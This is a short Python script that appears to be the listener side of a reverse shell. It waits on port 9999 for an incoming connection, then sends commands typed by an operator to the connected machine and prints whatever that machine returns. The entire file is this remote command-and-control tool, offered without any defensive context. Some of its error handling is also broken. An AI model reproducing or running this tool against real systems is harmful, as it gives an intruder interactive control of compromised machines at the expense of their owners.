import socket
import sys

host = ''
port = 9999

def create_socket():
    try:
        sock = socket.socket()
        print('[+] Initializing socket...')
        sock.bind((host, port))
        sock.listen((9))
    except socket.error as err:
        print('[-] Failed to Initialize socket : ', err)
        create_socket()
    accept_connection(sock)


def accept_connection(sock):
    try:
        conn, add = sock.accept()
    except socket.error as err:
        print('[-] Failed to accept the connection', err)
        accept_connection()
    print('[+] Connecting to IP :' , add[0])
    print('[+] Connecting on Port :,' , add[1], '\n')
    send_command(conn, sock)

def send_command(conn, sock):
    while True:
        cmd = input('Enter the command :\n')
        if  cmd == 'quit':
            conn.close()
            sock.close()
            sys.exit()
        if len(cmd) > 0:
            conn.send(str.encode((cmd)))
            revcieve_host = str(conn.recv(1024), "utf-8")
            print(revcieve_host, end="")

if __name__ == '__main__':
    create_socket()